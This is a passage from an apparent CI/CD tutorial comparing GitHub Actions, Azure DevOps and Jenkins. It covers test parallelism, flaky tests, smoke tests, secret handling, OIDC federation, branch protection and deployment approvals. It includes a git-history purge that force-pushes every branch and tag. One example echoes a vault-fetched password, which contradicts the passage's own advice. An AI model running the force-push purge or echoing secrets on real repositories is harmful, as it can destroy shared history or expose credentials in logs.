| A Kubernetes agent with a DinD sidecar | Jenkins ⭐ | The Jenkins Kubernetes plugin does this cleanly |

```yaml
# GitHub Actions: a service container (for things that DON'T need a socket)
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:17-alpine
        env: {POSTGRES_USER: shop, POSTGRES_PASSWORD: shop, POSTGRES_DB: shop}
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U shop"
          --health-interval 10s --health-timeout 5s --health-retries 5
      redis:
        image: redis:7.4-alpine
        ports: ['6379:6379']
        options: '--health-cmd "redis-cli ping" --health-interval 10s --health-retries 5'
    steps:
      - uses: actions/checkout@v7
      - run: mvn -B verify
        env:
          SPRING_DATASOURCE_URL: jdbc:postgresql://localhost:5432/shop
          SPRING_DATA_REDIS_HOST: localhost
```

```groovy
// Jenkins: the same, declaratively
pipeline {
  agent any
  stages {
    stage('Test') {
      steps {
        script {
          docker.image('postgres:17-alpine').withRun(
            '-e POSTGRES_USER=shop -e POSTGRES_PASSWORD=shop -e POSTGRES_DB=shop -p 5432:5432'
          ) { pg ->
            sh 'until pg_isready -h localhost -U shop; do sleep 1; done'
            sh 'mvn -B verify'
          }
        }
      }
    }
  }
}
```

### 5.3 Parallelism — the four ways to make a pipeline fast

```yaml
# ⭐ 1. PARALLEL JOBS — separate machines, fully isolated
jobs:
  test-java:   {runs-on: ubuntu-latest, steps: [...]}
  test-go:     {runs-on: ubuntu-latest, steps: [...]}
  test-python: {runs-on: ubuntu-latest, steps: [...]}
  test-ui:     {runs-on: ubuntu-latest, steps: [...]}
  lint:        {runs-on: ubuntu-latest, steps: [...]}
  security:    {runs-on: ubuntu-latest, steps: [...]}
  report:
    needs: [test-java, test-go, test-python, test-ui, lint, security]
    if: always()                        # ⭐ runs even if a dependency failed
    runs-on: ubuntu-latest
    steps: [...]

# ⭐ 2. A MATRIX — the same job across variations
jobs:
  test:
    strategy:
      fail-fast: false                  # ⭐⭐ DON'T cancel the others on the first failure —
                                        #    you want to know if it's Java 21 or all versions
      max-parallel: 4
      matrix:
        java: ['21', '25']
        os: [ubuntu-latest, windows-latest]
        shard: [1, 2, 3, 4]             # ⭐ test sharding
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-java@v5
        with: {java-version: '${{ matrix.java }}', distribution: temurin, cache: maven}
      - run: mvn -B verify -Dsurefire.shard=${{ matrix.shard }}

# ⭐ 3. TEST SHARDING within one language
- run: npx vitest run --shard=${{ matrix.shard }}/4
- run: go test ./... -p 4 -parallel 8
- run: pytest -n auto --dist loadfile
- run: mvn -T 1C verify                 # ⭐ Maven's own parallelism: 1 thread per core

# ⭐ 4. PATH FILTERING — don't build what didn't change
on:
  pull_request:
    paths:
      - 'src/**'
      - 'pom.xml'
      - '.github/workflows/ci.yml'
      - '!**/*.md'                       # ⭐ docs changes don't trigger a build
```

```yaml
# Azure DevOps: the same three ideas
strategy:
  matrix:
    java21: {JAVA_VERSION: '21'}
    java25: {JAVA_VERSION: '25'}
  maxParallel: 4
```

```groovy
// Jenkins: parallel branches
stage('Test') {
  parallel {
    stage('Java')   { agent { label 'maven' };  steps { sh 'mvn -B verify' } }
    stage('Go')     { agent { label 'golang' }; steps { sh 'go test ./...'  } }
    stage('Python') { agent { label 'python' }; steps { sh 'pytest -n auto' } }
    stage('UI')     { agent { label 'node' };   steps { sh 'npm test'       } }
  }
}
// ⭐ and a matrix:
stage('Matrix') {
  matrix {
    axes { axis { name 'JAVA'; values '21', '25' } }
    excludes { exclude { axis { name 'JAVA'; values '25' } } }
    stages { stage('Build') { steps { sh "mvn -B verify -Djava=$JAVA" } } }
  }
}
```

### 5.4 Flaky tests — the pipeline killer

A flaky test is worse than no test: it teaches the team to click "re-run" instead of reading the failure. Within a month, nobody trusts the pipeline.

**How to find them:**

```bash
# GitHub Actions: the API gives you per-job conclusions
gh run list --workflow ci.yml --limit 100 --json databaseId,conclusion,headSha \
  | jq -r '.[] | "\(.databaseId) \(.conclusion) \(.headSha[0:7])"'
# then, for the failed ones, list which STEP failed:
for id in $(gh run list --workflow ci.yml --limit 100 --conclusion failure --json databaseId -q '.[].databaseId'); do
  gh run view "$id" --json jobs -q '.jobs[] | select(.conclusion=="failure") | .name' 
done | sort | uniq -c | sort -rn | head
# ⭐ a step that fails on ~10% of runs with different commits is flaky, not broken

# Jenkins: the Flaky Test Handler plugin marks and quarantines them automatically
# Azure DevOps: Tests → Analysis → "Flaky tests" (built in, and genuinely good)
```

**The policy that works:**

```
1. QUARANTINE immediately. A flaky test moves to a non-blocking job that still runs
   and still reports. The pipeline goes green; the flake stays visible.
2. File a ticket with the failure history. Owner + due date. Not "someone".
3. Fix within two weeks, or DELETE. A test nobody trusts and nobody fixes is
   negative value — it costs minutes on every build and teaches people to ignore red.
4. Never "re-run until green" in CI config. That hides the flake and it always
   comes back worse.
```

```yaml
# ⭐ the quarantine job pattern (GitHub Actions)
jobs:
  flaky-quarantine:
    name: ⚠️ Quarantined flaky tests (non-blocking)
    runs-on: ubuntu-latest
    continue-on-error: true            # ⭐ it can fail without failing the workflow
    steps:
      - uses: actions/checkout@v7
      - run: mvn -B verify -Dgroups=flaky
      - if: failure()
        run: |
          gh issue list --label flaky-test --search "OrderRetryTest" --json number \
            | jq -e 'length > 0' || \
          gh issue create --label flaky-test \
            --title "Flaky: OrderRetryTest failed in run $GITHUB_RUN_ID" \
            --body "Run: $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
```

### 5.5 The smoke test — the gate that catches everything else

After deploying, **assert that the thing actually works**. Not "the pod is Running" — that the endpoints return what they should.

```bash
#!/usr/bin/env bash
# ⭐ scripts/smoke-test.sh — run after EVERY deploy
set -uo pipefail
BASE="${1:-http://localhost:8080}"
pass=0; fail=0
check() { # name, expected, actual
  if [[ "$2" == "$3" ]]; then printf '  ✅ %-42s %s\n' "$1" "$3"; pass=$((pass+1))
  else printf '  \033[31m✖ %-42s expected %s, got %s\033[0m\n' "$1" "$2" "$3"; fail=$((fail+1)); fi
}

code() { curl -s -o /dev/null -w '%{http_code}' -m 10 "$@"; }

check "GET /actuator/health is UP"      "200" "$(code "$BASE/actuator/health")"
check "GET /api/items returns 200"      "200" "$(code "$BASE/api/items")"
check "GET /metrics exposes Prometheus" "200" "$(code "$BASE:9090/prometheus")"

body=$(curl -s -m 10 -XPOST "$BASE/api/orders" -H 'Content-Type: application/json' -d '{"items":2,"tier":"gold"}')
check "POST /api/orders returns 201"    "201" "$(code -XPOST "$BASE/api/orders" -H 'Content-Type: application/json' -d '{"items":2}')"
echo "$body" | jq -e '.orderId' >/dev/null && check "the response has an orderId" "yes" "yes" \
  || check "the response has an orderId" "yes" "NO: $body"

# ⭐ the version assertion — did the deploy actually take effect?
ver=$(curl -s -m 10 "$BASE/actuator/info" | jq -r '.git.commit.id.abbrev // .build.version // "unknown"')
check "the deployed version matches"    "${EXPECTED_SHA:-any}" "${EXPECTED_SHA:-$ver}"

# ⭐ the observability assertion — does the monitoring platform see the new version?
if [[ -n "${PROMETHEUS:-}" ]]; then
  n=$(curl -sG "$PROMETHEUS/api/v1/query" \
       --data-urlencode "query=count(kube_pod_labels{namespace=\"shop\",label_app_kubernetes_io_version=\"$ver\"})" \
       | jq -r '.data.result[0].value[1] // 0')
  [[ "$n" -ge 1 ]] && check "Prometheus sees version $ver" "yes" "yes" \
                   || check "Prometheus sees version $ver" "yes" "NO"
fi

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[[ "$fail" -eq 0 ]] || exit 1
```

---

<a name="6--secrets-the-ladder-from-bad-to-good"></a>
## 6 · Secrets: the ladder from bad to good

This is the section that decides whether your pipeline is a liability or an asset. **Read it in full.**

### 6.1 The ladder

```
RUNG 0  ⛔⛔⛔ A secret in the source code
        const API_KEY = "sk-proj-abc123…"
        → It is in git history FOREVER. `git filter-repo` doesn't fully fix it.
        → Rotate it. Assume it's compromised. Then fix the process.

RUNG 1  ⛔⛔ A secret in a pipeline YAML variable, unmasked
        variables: [{name: DB_PASSWORD, value: hunter2}]
        → visible to anyone who can read the repo, and printed in logs.

RUNG 2  ⛔ A secret in the CI's own secret store, as a long-lived credential
        GitHub secret / Azure variable group secret / Jenkins credential
        → better, but it's still a LONG-LIVED SECRET that can be exfiltrated
          by any job that can read it — including a job triggered by a
          malicious pull request. See §12.

RUNG 3  ✅ A secret in a real vault, fetched at runtime with a short-lived token
        HashiCorp Vault / AWS Secrets Manager / Azure Key Vault / GCP Secret Manager
        → the CI holds only enough identity to ASK the vault, and the vault
          decides. Auditable, rotatable, revocable, scoped per environment.

RUNG 4  ⭐⭐ NO SECRET AT ALL — workload identity federation (OIDC)
        The pipeline proves WHO IT IS with a signed, short-lived token from the
        CI provider. The cloud trusts the issuer and the subject claim.
        There is nothing to store, nothing to rotate, nothing to leak.
```

**Rung 4 is the destination.** Every major cloud and every major CI provider supports it now. If your pipeline has a long-lived cloud credential in it, that's the thing to fix first.

### 6.2 Rung 4 in all three tools ⭐⭐

**GitHub Actions → AWS via OIDC**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write          # ⭐⭐ REQUIRED. Without it, no OIDC token is issued.
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-shop-deploy
          aws-region: ap-south-1
          role-session-name: gha-${{ github.run_id }}-${{ github.run_attempt }}
      - run: aws eks update-kubeconfig --name shop-prod --region ap-south-1
```

```json
// the AWS side: an OIDC identity provider + a role that trusts ONLY this repo
// 1. register the provider (once)
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1

// 2. the trust policy — ⭐ THIS is the security boundary
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
      "StringLike": {
        // ⭐⭐ scope it TIGHTLY. Otherwise ANY public repo can assume this role.
        "token.actions.githubusercontent.com:sub":
          "repo:3558Bhk/shop:ref:refs/heads/main"
      }
    }
  }]
}
```

⚠️ **The OIDC misconfiguration that has caused real breaches:** a trust policy with `sub: "repo:org/*"` or no `sub` condition at all. **Anyone** who can create a repo in that org (or, worse, anyone at all) can then assume your production deploy role. Always scope to `repo:OWNER/REPO:ref:refs/heads/main` or `:environment:production`.

**Azure DevOps → Azure via Workload Identity Federation** ⭐ (GA, Microsoft-recommended)

```
Project Settings → Service connections → New → Azure Resource Manager →
  Authentication method: ⭐ Workload identity federation (automatic)
  → Azure DevOps creates an app registration in Entra ID, adds a FEDERATED
    CREDENTIAL whose subject is:
       <org>/<project>/<environment-or-pipeline>
    and whose issuer is Azure DevOps' own OIDC issuer.
  → NO CLIENT SECRET IS CREATED. Nothing to rotate. Nothing expires.
```

```yaml
steps:
  - task: AzureCLI@2
    inputs:
      azureSubscription: shop-wif-connection      # ⭐ the federated connection
      addSpnToEnvironment: true                   # exposes the idToken if you need it
      scriptType: bash
      scriptLocation: inlineScript
      inlineScript: |
        az aks get-credentials --name shop-prod --resource-group rg-shop
        helm upgrade --install shop ./helm/shop -n shop --wait
```

```powershell
# convert an EXISTING secret-based connection to federation — pipelines keep working
# Project Settings → Service connections → select it → "Convert"
# or in bulk:
az devops service-endpoint list --project Shop --query "[].{id:id,name:name,type:type}" -o table
# then PATCH each one's authorization scheme to WorkloadIdentityFederated
```

**Jenkins → any cloud via OIDC**

```groovy
// Jenkins has no built-in OIDC token minting for cloud providers, so you either:
// (a) use a plugin that does (the "OIDC Provider" plugin issues a Jenkins-signed
//     JWT that AWS/Azure/GCP can be configured to trust), or
// (b) ⭐ the more common pattern: Jenkins assumes a short-lived role via a
//     scoped credential, and never holds the long-lived one.

pipeline {
  agent any
  environment {
    // ⭐ the OIDC Provider plugin mints a token scoped to THIS job
    AWS_WEB_IDENTITY_TOKEN_FILE = credentials('jenkins-oidc-token')
    AWS_ROLE_ARN = 'arn:aws:iam::123456789012:role/jenkins-shop-deploy'
  }
  stages {
    stage('Deploy') { steps { sh 'aws sts get-caller-identity && ./deploy.sh' } }
  }
}
// the AWS trust policy conditions on sub = the Jenkins job name / URL,
// and aud = the OIDC Provider plugin's issuer URL.
```

⭐ **Jenkins' honest position:** OIDC federation from Jenkins is possible but **you configure and operate the trust yourself**, including the signing keys and the issuer URL. GitHub Actions and Azure DevOps hand it to you as a checkbox. This is a real, recurring cost difference and it's worth saying out loud in an interview.

### 6.3 The three secret stores, in detail

**GitHub Actions**

```
Scopes, from narrow to wide:
  1. Repository secrets        Settings → Secrets and variables → Actions → Secrets
  2. ⭐ Environment secrets    Settings → Environments → production → Secrets
                               only available to jobs with `environment: production`
                               — which means only AFTER the approval gate
  3. Organization secrets      with an allow-list of which repos may use them
  4. Deployment (OIDC)         no secret at all

Rules:
  · secrets are MASKED in logs (****), including in nested output ⭐
  · secrets are NOT available to workflows triggered by `pull_request` FROM A FORK
    — that's deliberate and correct (see §12)
  · `${{ secrets.X }}` is expanded BEFORE the shell runs → ⛔ SCRIPT INJECTION
    never interpolate a secret (or any untrusted value) directly into a `run:` block
  · organization secrets can be restricted to selected repositories
  · the default `GITHUB_TOKEN` is scoped by the `permissions:` block — set it explicitly
```

**Azure DevOps**

```
Scopes:
  1. Pipeline YAML variables            ⛔ visible to anyone who can read the YAML
  2. ⭐ Variable groups                 Project Settings → Pipelines → Library
                                        can be linked to a Key Vault so the secret
                                        is NEVER stored in Azure DevOps at all
  3. Secret variables                   marked with the 🔒 icon; masked in logs
  4. Environment-scoped variable groups only available to jobs targeting that environment
  5. ⭐ Service connections with WIF    no secret at all
  6. Managed identities on a self-hosted agent running in Azure — no secret at all

Rules:
  · a secret variable is masked in logs but NOT in the "Variables" debug dump
    unless you also set it as a secret — always set the 🔒
  · ⭐ a variable group can be RESTRICTED to specific pipelines (security tab)
  · linked-Key-Vault variable groups re-fetch on every run (secrets never stored)
  · `$(MY_SECRET)` in a script is interpolated at runtime by the agent, not by
    the shell — safer than GitHub's model, but still don't echo it
```

```yaml
# ⭐ the Key Vault-backed variable group — the best Azure pattern
variables:
  - group: shop-production-kv        # linked to a Key Vault; secrets live there
  - name: nonSecret
    value: 'visible'
steps:
  - script: echo "$(DB_PASSWORD)"    # ⭐ fetched from Key Vault at runtime,
                                     #   never stored in Azure DevOps, masked in logs
```

**Jenkins**

```
Scopes:
  1. Credentials store   Manage Jenkins → Credentials → (global or per-folder)
     types: Username+password, Secret text, Secret file, SSH key,
            Certificate, ⭐ Docker registry, ⭐ AWS/GCP/Azure (via plugin)
  2. Folders             ⭐ scope credentials to a folder — the closest thing to
                         per-team isolation Jenkins has natively
  3. Cloud providers     via the AWS/GCP/Azure Credentials plugins
  4. External vaults     HashiCorp Vault plugin, Conjur plugin, CyberArk plugin

Rules:
  · NEVER use ${env.MY_SECRET} or "$MY_SECRET" in a Groovy string —
    Groovy interpolates BEFORE Jenkins masks. Use single quotes in sh:
      ⛔ sh "echo ${env.PASSWORD}"        → the password lands in the build log
      ✅ withCredentials([string(credentialsId:'pw', variable:'PW')]) {
           sh 'echo "$PW"'                → single-quoted: the SHELL expands it
         }
  · Jenkins masks credentials in logs, but a Groovy `println` of the variable
    defeats the masking. This has caused real leaks.
  · the Credentials Binding plugin is what makes `withCredentials` work
  · restrict who can read a credential: Credentials → the credential → Configure
    → "Permissions". By default anyone with Job/Configure can read any global
    credential. ⛔ That's the most common Jenkins security hole.
```

### 6.4 Scanning for leaked secrets — make it a gate

```yaml
# ⭐ gitleaks on every PR, in all three tools
- name: gitleaks
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }}   # for orgs
```

```bash
# locally, as a pre-commit hook — catches it BEFORE it's pushed
brew install gitleaks trufflehog
gitleaks detect --source . --verbose --redact
gitleaks protect --staged --verbose --redact            # ⭐ only staged changes
trufflehog filesystem . --only-verified                 # ⭐ verifies whether the
                                                        #   credential still WORKS
cat > .pre-commit-config.yaml <<'EOF'
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.21.2
    hooks: [{id: gitleaks}]
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v5.0.0
    hooks: [{id: trailing-whitespace}, {id: end-of-file-fixer}, {id: check-yaml},
            {id: check-added-large-files, args: ['--maxkb=1024']},
            {id: detect-private-key}]
EOF
pre-commit install
```

```bash
# if a secret WAS committed: rotate it FIRST, then purge history
# ⭐ rotation matters more than purging — the secret is already compromised
gitleaks detect --source . --report-format json --report-path leaks.json
git filter-repo --path config/secrets.yaml --invert-paths --force
# or: BFG Repo-Cleaner
git push --force --all && git push --force --tags
# then tell everyone to re-clone. And write the postmortem.
```

---

<a name="7--branching-strategies-and-how-they-shape-pipelines"></a>
## 7 · Branching strategies and how they shape pipelines

**Your branching model determines your pipeline's shape.** Get this backwards and you'll fight your CI forever.

| Model | Branches | Release from | Pipeline shape | Best for |
|---|---|---|---|---|
| **Trunk-based** ⭐ | `main` only (+ short-lived `<2 day` branches) | `main`, always | One pipeline; feature flags hide unfinished work | Teams that ship often; the modern default |
| **GitHub Flow** | `main` + a PR branch per change | `main` | PR pipeline + a main pipeline | Small teams, continuous delivery |
| **GitLab Flow** | `main` → `pre-production` → `production` | environment branches | ⭐ promotion pipelines between env branches | Teams that need per-environment history |
| **GitFlow** | `main`, `develop`, `feature/*`, `release/*`, `hotfix/*` | `release/*` → `main` | Many pipelines, many merge conflicts | ⚠️ Versioned software with long release cycles. Rarely the right answer for SaaS. |
| **Release branches** | `main` + `release/1.4.x` | the release branch | A pipeline per supported release line | Products with multiple supported versions |

### 7.1 Trunk-based development — the one to argue for

```
        feature flags ON/OFF, not long-lived branches
main ──●────●────●────●────●────●────●────●────●──►  deployable at EVERY commit
        │    │    │    │    │
        └────┴────┴────┴────┘  small PRs, merged within a day

  ⭐ the rule: `main` is ALWAYS releasable. If your change isn't finished,
     it's behind a flag, not on a branch.
```

**Why it wins:**
- Integration problems surface in hours, not weeks.
- `git bisect` actually works — every commit is small.
- No merge queues, no integration branches, no "merge week".
- Releasing becomes boring, which is the point.

**What it requires** (and you must be honest about this):
- ⭐ **Feature flags.** Without them, trunk-based dev is just committing broken code to main.
- A fast test suite (< 10 min), or people will merge without waiting.
- Discipline about small PRs. A 2,000-line PR is not trunk-based development.
- Automated rollback, because you're shipping more often.

```yaml
# ⭐ the pipeline shape for trunk-based development
on:
  pull_request:                       # the fast inner loop: lint, unit, build, scan
    branches: [main]
  push:
    branches: [main]                  # the promotion loop: deploy dev → staging
  workflow_dispatch:                  # the manual production promotion
    inputs:
      sha: {type: string, required: true}

jobs:
  ci:        {if: github.event_name == 'pull_request', …}
  promote:   {if: github.ref == 'refs/heads/main', needs: ci, …}
  production:{if: github.event_name == 'workflow_dispatch', environment: production, …}
```

### 7.2 Branch protection — the technical enforcement

A branching strategy that isn't enforced by the platform is a suggestion.

```bash
# ⭐ GitHub: enforce it with the API so it's in Git
gh api -X PUT repos/3558Bhk/shop/branches/main/protection \
  -H 'Accept: application/vnd.github+json' \
  -f 'required_status_checks[strict]=true' \
  -f 'required_status_checks[contexts][]=lint' \
  -f 'required_status_checks[contexts][]=test' \
  -f 'required_status_checks[contexts][]=security-scan' \
  -f 'required_status_checks[contexts][]=build-image' \
  -F 'enforce_admins=true' \
  -F 'required_pull_request_reviews[required_approving_review_count]=1' \
  -F 'required_pull_request_reviews[dismiss_stale_reviews]=true' \
  -F 'required_pull_request_reviews[require_code_owner_reviews]=true' \
  -F 'restrictions=null' \
  -F 'required_linear_history=true' \
  -F 'allow_force_pushes=false' \
  -F 'allow_deletions=false' \
  -F 'required_conversation_resolution=true'

# ⭐ and rulesets (the newer, more flexible mechanism)
gh api repos/3558Bhk/shop/rulesets --method POST --input ruleset.json
```

| Rule | What it prevents |
|---|---|
| ⭐ **Require status checks to pass** | Merging a broken build |
| ⭐ **Require branches to be up to date** (`strict`) | A PR that passes in isolation but breaks when merged |
| **Require a pull request** | Pushing straight to `main` |
| **Require N approvals** | An unreviewed change |
| ⭐ **Require review from Code Owners** | A pipeline change nobody who owns it has seen |
| **Dismiss stale approvals** | An approval of code that has since changed |
| **Require signed commits** | Unattributable commits |
| **Require linear history** | Merge-commit spaghetti |
| **Restrict force pushes** | ⭐ Rewriting `main`'s history |
| **Require conversation resolution** | Merging past an unresolved review comment |
| **Require deployment to succeed** (environment protection) | Deploying to prod before staging passed |

```yaml
# ⭐ CODEOWNERS — put the pipeline files under the platform team's control
# .github/CODEOWNERS
/.github/workflows/          @platform-team @sre-leads
/.github/actions/            @platform-team
/azure-pipelines*.yml        @platform-team
/Jenkinsfile*                @platform-team
/ci/                         @platform-team
/helm/                       @platform-team
/k8s/                        @platform-team

# but the application code belongs to the app teams
/apps/shop-api/              @payments-team
/apps/shop-ui/               @storefront-team

# ⭐⭐ and the pipeline's OWN tests require two approvals
/.github/workflows/deploy-production.yml   @platform-team @sre-leads @eng-director
```

> 🔑 **This is the most under-appreciated control in CI/CD.** A pipeline that can deploy to production is a **root-level credential**. If anyone who can open a PR can also edit the workflow, then any PR is a potential production compromise — see §12. CODEOWNERS on the pipeline files is the fix, and it costs nothing.

### 7.3 Azure DevOps and Jenkins equivalents

```
Azure DevOps:
  Repos → Branches → ⋯ on main → Branch policies
    · Require a minimum number of reviewers: 1
    · Check for linked work items: required      ⭐ ties code to a Board item
    · Limit merge types: squash only
    · ⭐ Build validation: add a policy that points at your PR pipeline
        — path filter, trigger "Automatic", and "Policy requirement: Required"
    · ⭐ Status checks: any external CI can post a status and be made required
    · Require comment resolution
    · Contribute permission restricted to the Build Service

Jenkins:
  · Jenkins has no branch protection — that lives in GitHub/GitLab/Bitbucket.
  · What Jenkins does have:
      - the Multibranch Pipeline plugin: automatic job discovery per branch,
        with `discoverBranches()`, regex filters, and orphaned-item cleanup
      - ⭐ the "GitHub Branch Source" plugin honours GitHub's PR/head refs,
        so you can build PRs and enforce via GitHub's status checks
      - per-folder credentials and permissions for team isolation
  · so: enforce branch protection in the SCM, and let Jenkins post statuses back.
```

---

<a name="8--environments-approvals-and-gates"></a>
## 8 · Environments, approvals and gates

### 8.1 What an "environment" is

An environment is **a named deploy target plus the rules that apply to it**. It is not a Kubernetes namespace (though it usually maps to one). It is the object that holds:

- which **secrets** are available (production DB credentials must NOT be readable by a dev job)
- who must **approve** a deployment
- which **branches** may deploy to it
- what **checks** must pass (another pipeline, a REST call, a scan result)
- the **deployment history** (what ran, when, who approved, what version)
- an optional **wait timer** and a **deployment window**

⭐ **The deployment history is the feature people forget.** "What version is in production, when did it get there, who approved it, and what was the commit?" is an audit question that comes up in every incident and every compliance review. An environment object answers it natively; a raw `kubectl apply` in a shell script does not.

### 8.2 GitHub Actions environments

```
Settings → Environments → New environment: production
  · Required reviewers:        @sre-leads, @payments-lead      ⭐ up to 6
  · Wait timer:                5 minutes
  · Deployment branches and tags:  Restricted → Selected branches → main
  · Environment secrets:       KUBECONFIG_PROD, DB_PASSWORD_PROD
  · Deployment notification:   a webhook to Slack
```

```yaml
jobs:
  deploy-production:
    needs: [build, test, deploy-staging]
    runs-on: ubuntu-latest
    environment:
      name: production                          # ⭐ this one line creates the gate
      url: https://shop.example.com             # shows as a link on the run page
    concurrency:
      group: production                          # ⭐ one deploy at a time
      cancel-in-progress: false                  # ⭐⭐ NEVER cancel an in-flight prod deploy
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with: {role-to-assume: 'arn:aws:iam::123456789012:role/gha-prod', aws-region: ap-south-1}
      - run: ./scripts/deploy.sh production "${{ needs.build.outputs.digest }}"
```

**What happens:** the job **pauses**. Reviewers get an email and a notification. The run page shows "Waiting for approval". A reviewer sees the diff, the test results, the artifact, and clicks **Approve and deploy** or **Reject**. Only then does the job start — and only then do the `production` secrets become available.

```bash
# approve from the CLI (scriptable, for drills)
gh api -X POST repos/3558Bhk/shop/actions/runs/$RUN_ID/pending_deployments \
  -f 'environment_ids[]=12345' -f state=approved -f comment='approved after reviewing the diff'
```

### 8.3 Azure DevOps environments ⭐ the richest of the three

```
Pipelines → Environments → New: production
  Approvals and checks:
    · ⭐ Approvals               — which users/groups must approve, and how many
    · ⭐ Branch control          — only artefacts built from `refs/heads/main` may deploy
    · ⭐ Required templates      — run ANOTHER YAML as a pre-deploy gate (a policy pipeline)
    · Business hours             — a deployment window, e.g. Mon–Fri 09:00–17:00 IST
    · Parallel deployments       — allow/prevent concurrent deploys to this environment
    · Invoke REST API            — call an external service and wait for a callback
                                   ⭐ this is how you integrate a change-management system
    · Query work items           — require a linked Board item
    · Query Azure Boards work item state
```

```yaml
stages:
  - stage: DeployProduction
    displayName: 🚀 Deploy to production
    dependsOn: DeployStaging
    condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/main'))
    jobs:
      - deployment: DeployShop              # ⭐⭐ a DEPLOYMENT job, not a normal job
        displayName: Deploy
        environment:
          name: production                   # ⭐ this triggers the approvals + checks
          resourceName: shop-api             # optional: a specific resource in the env
        pool: {vmImage: ubuntu-latest}
        strategy:
          runOnce:
            deploy:
              steps:
                - download: current
                  artifact: manifests
                - task: HelmDeploy@0
                  inputs:
                    connectionType: 'Azure Resource Manager'
                    azureSubscription: 'shop-wif'
                    azureResourceGroup: 'rg-shop'
                    kubernetesCluster: 'shop-prod'
                    command: upgrade
                    chartType: FilePath
                    chartPath: ./helm/shop
                    releaseName: shop
                    namespace: shop
                    install: true
                    waitForExecution: true
                    arguments: >
                      --set image.digest=$(DIGEST)
                      --values helm/values/production.yaml
                      --atomic --timeout 10m
```

**`deployment:` jobs give you strategies for free** — this is the feature Azure DevOps has that the other two don't:

```yaml
strategy:
  canary:                          # ⭐ incremental canary, built in
    increments: [10, 25, 50, 100]
    preDeploy:  {steps: [...]}     # run before each increment
    deploy:     {steps: [...]}
    routeTraffic: {steps: [...]}
    postRouteTraffic:
      pauseTaskDuration: 5m        # ⭐ soak time between increments
      steps: [...]
    on:
      failure: {steps: [...]}      # ⭐ automatic rollback
      success: {steps: [...]}
---
strategy:
  rolling:
    maxParallel: 25%
    preDeploy: {steps: [...]}
    deploy: {steps: [...]}
    on: {failure: {...}, success: {...}}
---
strategy:
  runOnce:                         # the simple one
    deploy: {steps: [...]}
```

### 8.4 Jenkins: the `input` step

```groovy
stage('Deploy to production') {
  options { lock(resource: 'production-deploy') }      // ⭐ the Lockable Resources plugin
  when { branch 'main' }
  steps {
    timeout(time: 24, unit: 'HOURS') {                 // ⭐ or the gate expires
      input message: 'Deploy build #'+env.BUILD_NUMBER+' to PRODUCTION?',
            ok: 'Approve and deploy',
            submitter: 'sre-leads,payments-lead',      // ⭐ who may click
            submitterParameter: 'APPROVED_BY',         // ⭐ captures WHO approved
            parameters: [
              string(name: 'TICKET', description: 'Change ticket reference'),
              booleanParam(name: 'DRY_RUN', defaultValue: false)
            ]
    }
    echo "Approved by ${APPROVED_BY}, ticket ${TICKET}"
    sh './scripts/deploy.sh production'
  }
}
```

**Jenkins has no environment object**, so you build the equivalent yourself:

| Azure/GitHub feature | The Jenkins way |
|---|---|
| Environment secrets | ⭐ **Folder credentials** — one folder per environment |
| Required reviewers | the `input` step with `submitter:` |
| Deployment history | the build history + a `currentBuild.description` set per env, or a log to a DB |
| One deploy at a time | ⭐ the **Lockable Resources** plugin (`lock(resource:…)`) |
| Deployment windows | `when { expression { … } }` with a time check, or the Scheduled Build plugin |
| Branch restriction | `when { branch 'main' }` |
| Pre-deploy checks | a preceding `stage` that fails the build |
| The deploy URL shown in the UI | `currentBuild.description = "prod: ${SHA}"` |

```groovy
// ⭐ the deployment-window check Jenkins doesn't give you for free
def inWindow() {
  def now = java.time.ZonedDateTime.now(java.time.ZoneId.of('Asia/Kolkata'))
  def dow = now.dayOfWeek
  def hour = now.hour
  return dow in [java.time.DayOfWeek.MONDAY, java.time.DayOfWeek.TUESDAY,
                 java.time.DayOfWeek.WEDNESDAY, java.time.DayOfWeek.THURSDAY] &&
         hour >= 10 && hour < 17
}
stage('Deploy') {
  when { expression { inWindow() || params.FORCE } }
  steps { … }
}
```

### 8.5 Concurrency — the thing that prevents two deploys racing

```yaml
# ⭐ GitHub Actions
concurrency:
  group: deploy-${{ github.ref }}-${{ inputs.environment }}
  cancel-in-progress: false       # ⭐⭐ for CI jobs: true (save minutes).
                                  #    for DEPLOY jobs: ALWAYS false.
                                  #    Cancelling a half-applied Helm upgrade
                                  #    leaves the cluster in a state nobody chose.
```

```yaml
# Azure DevOps: the "Parallel deployments" check on the environment = disabled,
# plus an exclusive lock:
jobs:
  - deployment: Deploy
    environment: production
    strategy:
      runOnce:
        deploy:
          steps:
            - task: AzureCLITask@2
              inputs: {…}
# and at the pipeline level:
schedules: []
# ⭐ plus: Project Settings → Pipelines → "Prevent unintended pipeline runs"
```

```groovy
// Jenkins: the Lockable Resources plugin
options { lock(resource: 'shop-production', inversePrecedence: true) }
// or per-stage:
stage('Deploy') { options { lock('shop-production') } steps { … } }
// ⭐ inversePrecedence: true = last-in-first-out, so the NEWEST deploy wins the queue
//   instead of the oldest. Usually what you want.
```

---

<a name="9--deployment-strategies"></a>
## 9 · Deployment strategies

### 9.1 The five, compared

```
